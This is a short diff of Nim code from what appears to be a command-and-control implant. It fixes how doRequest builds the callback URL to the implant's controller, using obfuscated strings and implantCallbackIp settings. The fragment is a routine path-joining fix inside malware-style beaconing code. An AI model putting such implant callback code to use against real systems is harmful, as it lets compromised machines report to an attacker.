@@ -89,8 +89,8 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                 # Standard mode: use implantCallbackIp from config
                 # Check if implantCallbackIp already includes protocol (http:// or https://)
                 if li.implantCallbackIp.startsWith("http://") or li.implantCallbackIp.startsWith("https://"):
-                    # Full URL provided, use as-is
-                    target = li.implantCallbackIp
+                    # Full URL provided, use as-is and append path
+                    target = li.implantCallbackIp & path
                 else:
                     # Only host provided, build URL with protocol from config
                     target = toLowerAscii(li.listenerType) & "://"
@@ -107,8 +107,8 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                         target = target & li.implantCallbackIp & ":" & li.listenerPort
                     else:
                         target = target & li.implantCallbackIp
-                
-                target = target & path
+                    
+                    target = target & path
 
             when defined verbose:
                 echo obf("DEBUG: doRequest() - target URL: ") & target
